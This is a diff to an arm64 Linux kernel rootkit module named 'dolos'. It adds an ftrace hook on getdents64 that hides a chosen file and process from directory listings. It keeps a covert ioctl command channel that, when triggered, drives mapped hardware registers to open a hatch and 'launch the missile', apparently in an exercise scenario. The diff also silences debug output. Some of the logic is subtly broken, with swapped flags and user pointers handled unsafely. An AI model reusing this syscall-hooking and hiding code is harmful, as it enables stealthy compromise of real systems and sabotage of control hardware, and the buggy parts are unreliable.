@@ -11,13 +11,12 @@
 #include <linux/errno.h>
 #include <linux/ftrace.h>
 #include <linux/delay.h>
-#include <linux/string.h>
 
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.1");
 
 #ifndef DEBUG
-#define DEBUG 1
+#define DEBUG 0
 #endif
 #define MAX_NAME 256
 #define ROOTKIT -1877
@@ -26,6 +25,7 @@ MODULE_VERSION("0.1");
 #define CHECKUP 80085
 #define GOODRET 42
 #define HIDEFILE 1234
+
 /* A simple debug print macro that will be compiled out if not defined */
   /* https://stackoverflow.com/questions/1644868/define-macro-for-debug-printing-in-c */
 #define debug_print(fmt, args...)\
@@ -34,6 +34,7 @@ MODULE_VERSION("0.1");
 bool gotime = false;
 char pid[MAX_NAME];
 char filename[MAX_NAME];
+char lpid[MAX_NAME];
 bool rfilename = false;
 bool rpid = false;
 
@@ -62,8 +63,10 @@ RegisterMap *reg_map1;
 RegisterMap *rm;
 
 typedef asmlinkage long (*orig_syscall_t)(const struct pt_regs *);
+typedef asmlinkage int (*orig_getdents64_t)(const struct pt_regs *);
 
 orig_syscall_t orig_ioctl;
+orig_getdents64_t orig_getdents64;
 
 const char *HIDE_DIR = "dolos";
 
@@ -81,6 +84,8 @@ struct ftrace_hook {
         .original = (_original),             \
     }
 
+int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count, int orig_ret);
+
 static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
 /* When an ftraced function gets called, this is our generic handler. It will call our version of the hooked function */
 {	
@@ -95,8 +100,148 @@ static void notrace dolos_ftrace_stub(unsigned long ip, unsigned long parent_ip,
     }
 }
 
+/* Hook to hide directories/files */
 
-static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp);
+static asmlinkage int dolos_getdents64(struct pt_regs *regs) {
+
+    int check;
+
+    // We want the output of the original getdents64
+
+    int orig_ret = orig_getdents64(regs);
+
+    
+
+    // Return original if error or we do not have the pid or filename yet
+
+    if (orig_ret <= 0 || (!rpid && !rfilename)) { // Error -> errno already set
+
+    	return orig_ret;
+
+    }
+
+    
+
+    struct linux_dirent64 *ker_dirent;
+
+    ker_dirent = (struct linux_dirent64 *)kzalloc(orig_ret, GFP_KERNEL); // zero out mem for ker_dirent  
+
+
+
+    check = copy_from_user(ker_dirent, regs->regs[1], orig_ret); // Copy buffer into kernel mem
+
+    unsigned int count = 0;
+
+    count = regs->regs[2];
+
+    
+
+    if (ker_dirent->d_reclen == 0) {
+
+    	kfree(ker_dirent);
+
+    	return orig_ret;
+
+    }
+
+
+
+    int bytes_to_return = malicious_getdents64(ker_dirent, &count, orig_ret);
+
+
+
+    // If we changed anything, ensure we copy out our data
+
+    if (bytes_to_return != orig_ret) {
+
+        memset(regs->regs[1], 0, orig_ret); // Zero out buffer in userspace
+
+        check = copy_to_user(regs->regs[1], ker_dirent, bytes_to_return); // Copy buffer to userspace
+
+        regs->regs[2] = count; // Update the correct count
+
+    }
+
+
+
+    kfree(ker_dirent); // Free kernel mem
+
+    return bytes_to_return;
+
+}
+
+int malicious_getdents64(struct linux_dirent64 *ker_dirent, unsigned int *count, int orig_ret)
+
+{
+
+    int bytes_to_return = orig_ret;
+
+    unsigned long offset = 0;
+
+
+
+    char* ptr = (char*)ker_dirent; // Our current pointer in the buffer
+
+    bool hideFlag = false;
+
+    struct linux_dirent64 *curr = NULL;
+
+    struct linux_dirent64 *winner = NULL;
+
+
+
+    // Look through dirent structure to find the directories/files we want to hide
+
+    while(offset < orig_ret) {
+
+        ptr = (char*)ker_dirent + offset;
+
+        curr = (struct linux_dirent64*)ptr; // Our current pointer in the buffer
+
+        if (curr->d_reclen == 0)  {
+
+            return bytes_to_return;
+
+        }
+
+        if(rfilename && (strcmp(filename, curr->d_name)==0)) {
+
+            hideFlag = true;
+
+            winner = curr;
+
+            break;
+        
+
+        } else if(rpid && ((strcmp(pid, curr->d_name)==0) || (strcmp(lpid, curr->d_name)==0))) {
+
+            hideFlag = true;
+
+            winner = curr;
+
+            break;
+
+	}
+
+        offset += curr->d_reclen; // Go to next dirent
+
+    }
+
+    if(hideFlag) {
+
+    	    char* next = (char *)curr + curr->d_reclen;
+
+    	    bytes_to_return -= curr->d_reclen;
+
+	    memmove(winner, next, bytes_to_return - offset); // Shift buffer down
+
+    }
+
+    return bytes_to_return;
+
+}
+
+static void malicious_ioctl(unsigned long kernel_argp);
 
 
 /* set registers & determine hook*/
@@ -106,54 +251,44 @@ static asmlinkage long dolos_ioctl(struct pt_regs *regs)
     int ret = 0;
     unsigned int fd = regs->regs[0];
     unsigned int cmd = regs->regs[1];
-    unsigned long arg;
-    if (regs->regs[2] != NULL) {
-        arg = regs->regs[2];
-    }
+    void __user * arg = regs->regs[2];
+    
 
         if (fd == ROOTKIT) { // Our creators are talking to us
                 if (cmd == SENDPID) { // pid
-                        sprintf(pid, "/proc/%d", arg);
-			            sprintf(lpid, "%d", arg);
+                	rfilename = true;
+                        sprintf(pid, "/proc/%ld", arg);
+                        sprintf(lpid, "%ld", arg);
                         return GOODRET;
 
                 } else if (cmd == HIDEFILE) {
-                        __arch_copy_from_user(filename, (char *)arg, sizeof(((char*)arg)));
+                	rpid = true;
+                        copy_from_user(filename, arg, MAX_NAME);
                         return GOODRET;
 
                 } else if (cmd == RATSIGLAUNCH) { // CWEs ASSEMBLE
 			            gotime = true;
                         return GOODRET;
                 
-		} else if (cmd == CHECKUP) {
-			return GOODRET;
-		
-		} else {
-			return 0;
-		}
+                } else if (cmd == CHECKUP) {
+                    return GOODRET;
+                
+                } else {
+                    return 0;
+                }
         }
 
     if (gotime && cmd == 0x195) {
-        unsigned long *kernel_argp;
-        /* FIXME: UNCOMMENT whole block
-        
+        unsigned long kernel_argp;
         // copy_from_user(dest, source, size)
-        __n = __arch_copy_from_user(&kernel_argp,arg & 0xff7fffffffffffff,4); // Copy launch code
-        if (__n != 0) {
-            debug_print("copy from user FAILED.\n");
-            ret = orig_ioctl(regs);
-        } 
-        else {
-            malicious_ioctl(arg, *kernel_argp);
-        }
+        int __n = copy_from_user(&kernel_argp, arg, 4); // Copy launch code
+        malicious_ioctl(kernel_argp);
         // ......... stop uncommenting from fixme here ............
-        */
-        malicious_ioctl(arg, kernel_argp);
     }
 
     else {
         // pass to original function
-        // debug_print("cmd does not equal 0x195.\nPass to original ioctl function...\n");
+        //debug_print("cmd does not equal 0x195.\nPass to original ioctl function...\n");
         ret = orig_ioctl(regs);
     }
     return ret;
@@ -169,7 +304,6 @@ static void map_regions(void) {
 
   uVar7 = 0x68000000000713;
   rm = (RegisterMap *)kmalloc(0x8000,0x48);
-  uint8_t *buf = (uint8_t *)vmalloc(0x4000);
   reg_map1 = rm;
   addr1 = uVar7;
   if (arm64_use_ng_mappings != '\0') {
@@ -243,12 +377,11 @@ static void map_regions(void) {
   return;
 }
 
-static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
+
+static void malicious_ioctl(unsigned long kernel_argp)
 {
 
-        debug_print("\n\nmalicious_ioctl function called.\n\n");
-
-        map_regions(); // Map our register map
+        //debug_print("\n\nmalicious_ioctl function called.\n\n");
         
         int timeLimit = 10;
 
@@ -263,7 +396,7 @@ static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
         // turn on lights
 	    rm->rl->command = 1;
         msleep(2000);
-        debug_print("\n lights on. \n");
+        //debug_print("\n lights on. \n");
 
         // close blast door
         rm->bd->command = 2;
@@ -272,7 +405,7 @@ static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
             msleep(100);
             timeLimit --;
         }
-        debug_print("\n blast door closed. \n");
+        //debug_print("\n blast door closed. \n");
 
         // open hatch
         timeLimit = 80;
@@ -281,7 +414,7 @@ static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
             msleep(100);
             timeLimit --;
         }
-        debug_print("\n hatch opened. \n");
+        //debug_print("\n hatch opened. \n");
 
         // get missile ready for launch
 	    timeLimit = 200;
@@ -290,7 +423,7 @@ static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
 	    	msleep(100);
 	    	timeLimit --;
 	    }
-        debug_print("\n missile ready for launch. \n");
+        //debug_print("\n missile ready for launch. \n");
 
         // shut hatch
         timeLimit = 80;
@@ -299,7 +432,7 @@ static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
             msleep(100);
             timeLimit --;
         }
-        debug_print("\n HATCH CLOSED. \n");
+        //debug_print("\n HATCH CLOSED. \n");
 
         // open blastdoor
         rm->bd->command = 1;
@@ -311,17 +444,18 @@ static void malicious_ioctl(unsigned long arg, unsigned long *kernel_argp)
             msleep(100);
             timeLimit --;
         }
-        debug_print("\n blastdoor opened & lights killed. \n");
+        //debug_print("\n blastdoor opened & lights killed. \n");
 
 
         // launch the missile
 	    rm->mr->command = 3;
-        debug_print("\n MISSILE LAUNCHED. \n");
+        //debug_print("\n MISSILE LAUNCHED. \n");
 
 	
 	return;
 	
 }
+
 
 struct ftrace_ops ops = {
     .func = dolos_ftrace_stub,
@@ -353,10 +487,10 @@ static int install_hook(struct ftrace_hook* hook)
     /* save it to the hook struct */
     *(unsigned long *) hook->original = address;
 
-    debug_print("hook address at %lx\n", address);
+    //debug_print("hook address at %lx\n", address);
     if (address == 0)
     {
-        debug_print("Failed to find symbol %s\n", hook->name);
+        //debug_print("Failed to find symbol %s\n", hook->name);
         ret = 1;
         return ret;
     }
@@ -366,12 +500,12 @@ static int install_hook(struct ftrace_hook* hook)
 
     ret = ftrace_set_filter_ip(&hook->ops, address, 0, 0);
     if (ret) {
-        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
+        //debug_print("ftrace_set_filter_ip failed: %d\n", ret);
         return ret;
     }
     ret = register_ftrace_function(&hook->ops);
     if (ret) {
-        debug_print("register_ftrace_function %d\n", ret);
+        //debug_print("register_ftrace_function %d\n", ret);
         ftrace_set_filter_ip(&hook->ops, address, 1, 0);
     }
     return ret;
@@ -382,11 +516,11 @@ static void remove_hook(struct ftrace_hook* hook)
     int ret;
     ret = unregister_ftrace_function(&hook->ops);
     if (ret) {
-        debug_print("unregister_ftrace_function failed: %d\n", ret);
+        //debug_print("unregister_ftrace_function failed: %d\n", ret);
     }
     ret = ftrace_set_filter_ip(&hook->ops, *((unsigned long *) hook->original), 1, 0);
     if (ret) {
-        debug_print("ftrace_set_filter_ip failed: %d\n", ret);
+        //debug_print("ftrace_set_filter_ip failed: %d\n", ret);
     }
 }
 
@@ -424,7 +558,7 @@ static void remove_hooks(struct ftrace_hook * hooks, size_t count)
 /* an array of functions we want to hook */
 static struct ftrace_hook hooks[] = {
     HOOK("__arm64_sys_ioctl", dolos_ioctl, &orig_ioctl),
-
+    HOOK("__arm64_sys_getdents64", dolos_getdents64, &orig_getdents64),
 };
 
 
@@ -434,11 +568,11 @@ static int __init dolos_init(void)
     int ret = 0;
     ret = install_hooks(hooks, ARRAY_SIZE(hooks));
     if (ret) {
-        debug_print("failed to load: %d\n", ret);
+        //debug_print("failed to load: %d\n", ret);
         return ret;
     }
-    debug_print("Loaded\n");
-
+    //debug_print("Loaded\n");
+    map_regions(); // Map our register map
     return 0;
 }
 
@@ -448,7 +582,7 @@ static void __exit dolos_exit(void)
     int err;
     err = 0;
     remove_hooks(hooks, ARRAY_SIZE(hooks));
-    debug_print("unloaded\n");
+    //debug_print("unloaded\n");
 }
 
 /* register our init and exit functions */
